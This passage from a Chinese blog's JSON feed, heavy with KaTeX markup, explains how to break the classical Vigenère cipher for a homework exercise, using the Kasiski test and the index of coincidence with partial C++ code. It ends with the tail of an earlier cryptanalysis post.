mtight\">2</span></span></span></span></span></span></span></span></span></span></span> 的差值提升时，思路一的时间复杂度大幅降低，二者就又变得一样快了，猜测是因为这种情况下更容易找到线性无关的向量对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span>，使得所需的矩阵可逆。</p>\n<p>思路二的速度几乎不受输入的情况影响，总的来说更稳定效果更好。但是思路一输入条件特别简单的时候速度还是比思路二要好的。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/vigenere/",
            "url": "https://taf.fyi/math/cryptography/vigenere/",
            "title": "维吉尼亚密码",
            "date_published": "2024-09-18T16:00:00.000Z",
            "content_html": "<h1 id=\"破解原理\"><a class=\"anchor\" href=\"#破解原理\">#</a> 破解原理</h1>\n<ul>\n<li>Kasiski 测试法：\n<ul>\n<li>找到所有可能的周期  <code>m</code></li>\n</ul>\n</li>\n<li>指数重合法：\n<ul>\n<li>在备选周期中找到最有可能的周期</li>\n<li>在确定周期后用来确定密钥</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"代码实现\"><a class=\"anchor\" href=\"#代码实现\">#</a> 代码实现</h1>\n<p>这只是一个作业，用来完成在线测评，在这里输入假定：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mtext>密文长度</mtext><mo>:</mo><mtext>密钥长度</mtext><mo>&gt;</mo><mn>50</mn><mo>:</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">\\text{密文长度}:\\text{密钥长度} &gt; 50:1\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">密文长度</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">密钥长度</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></span></p>\n<h2 id=\"处理输入输出\"><a class=\"anchor\" href=\"#处理输入输出\">#</a> 处理输入输出</h2>\n<p>传统的维吉尼亚密码都是允许大小写，并且大小写统一在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">z</mi><mn>26</mn></msub></mrow><annotation encoding=\"application/x-tex\">\\mathbb{z}_{26}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 空间加密解密，其他空格、换行、标点符号均不参与加密，输出时须保留其原样。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    vector&lt;<span class=\"type\">char</span>&gt; input;</span><br><span class=\"line\">    vector&lt;<span class=\"type\">char</span>&gt; c;</span><br><span class=\"line\">    <span class=\"type\">int</span> input_l=<span class=\"number\">0</span>, c_l=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> tmp;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">fread</span>(&amp;tmp, <span class=\"built_in\">sizeof</span>(<span class=\"type\">char</span>), <span class=\"number\">1</span>, stdin))&#123;</span><br><span class=\"line\">        input.<span class=\"built_in\">push_back</span>(tmp);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((tmp &lt;= <span class=\"string\">&#x27;Z&#x27;</span> &amp;&amp; tmp &gt;= <span class=\"string\">&#x27;A&#x27;</span>) || (tmp &lt;= <span class=\"string\">&#x27;z&#x27;</span> &amp;&amp; tmp &gt;= <span class=\"string\">&#x27;a&#x27;</span>))&#123;</span><br><span class=\"line\">            c.<span class=\"built_in\">push_back</span>(tmp);</span><br><span class=\"line\">            c_l += <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        input_l += <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 破解获取密钥 K</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 解密并输出</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在这里使用了两个  <code>vector&lt;char&gt;</code>  存储了：</p>\n<ul>\n<li>包括空格、换行、标点符号的完整原文  <code>input</code></li>\n<li>去除了空格、换行、标点符号的密文  <code>c</code></li>\n</ul>\n<h2 id=\"寻找可能的周期\"><a class=\"anchor\" href=\"#寻找可能的周期\">#</a> 寻找可能的周期</h2>\n<p>维吉尼亚密码的破解经验来看，在密文中<mark>长度为 3 的相同密文段的距离以及它们的所有因数</mark>都可以作为可能的周期，当然 1 除外。在实践中，这样的相同密文段往往是存在的，并且并不稀疏，而长度为 4 开始就非常稀疏难以找到了。</p>\n<p>在这里只考虑长度为 3 的相同密文段，没有任何其他优化直接暴力枚举所有长度为 3 的密文段。为了防止重复，使用集合存储它们的距离。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">string <span class=\"title\">c_s</span><span class=\"params\">(c.begin(), c.end())</span></span>;</span><br><span class=\"line\">set&lt;<span class=\"type\">int</span>&gt; candidates;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;c_l<span class=\"number\">-2</span>;++i)&#123;</span><br><span class=\"line\">    string substr = c_s.<span class=\"built_in\">substr</span>(i, <span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> found = c_s.<span class=\"built_in\">substr</span>(i + <span class=\"number\">2</span>, c_l - i).<span class=\"built_in\">find</span>(substr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(found != string::npos)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> tmp = <span class=\"built_in\">abs</span>(i-(<span class=\"type\">int</span>)found);</span><br><span class=\"line\">        candidates.<span class=\"built_in\">insert</span>(tmp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"确定最有可能的周期\"><a class=\"anchor\" href=\"#确定最有可能的周期\">#</a> 确定最有可能的周期</h2>\n<p>对每一个备选周期，包括刚刚求出的一系列<mark>距离以及它们的因数</mark>，按照备选周期  <code>candidate = m</code>  将密文  <code>c</code>  在分为  <code>candidate</code>  段：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><msub><mi>y</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mi>y</mi><mn>1</mn></msub><mi>y</mi><mrow><mi>m</mi><mo>+</mo><mn>1</mn></mrow><msub><mi>y</mi><mrow><mn>2</mn><mi>m</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>⋯</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><msub><mi>y</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mi>y</mi><mn>2</mn></msub><mi>y</mi><mrow><mi>m</mi><mo>+</mo><mn>2</mn></mrow><msub><mi>y</mi><mrow><mn>2</mn><mi>m</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>⋯</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><msub><mi>y</mi><mi>m</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mi>y</mi><mi>m</mi></msub><mi>y</mi><mrow><mn>2</mn><mi>m</mi></mrow><msub><mi>y</mi><mrow><mn>3</mn><mi>m</mi></mrow></msub><mo>⋯</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\ny_1&amp;=y_1y{m+1}y_{2m+1}\\cdots\\\\\ny_2&amp;=y_2y{m+2}y_{2m+2}\\cdots\\\\\n&amp;......\\\\\ny_m&amp;=y_my{2m}y_{3m}\\cdots\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:6em;vertical-align:-2.7500000000000004em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.25em;\"><span style=\"top:-5.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.9099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7500000000000004em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.25em;\"><span style=\"top:-5.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span></span></span><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">2</span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span><span style=\"top:-0.9099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">3</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7500000000000004em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>对每一个长度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>l</mi><msub><mi>y</mi><mi>i</mi></msub></msub></mrow><annotation encoding=\"application/x-tex\">l_{y_i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，统计出 26 个字母各自的出现频数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>f</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">f_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，计算 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" 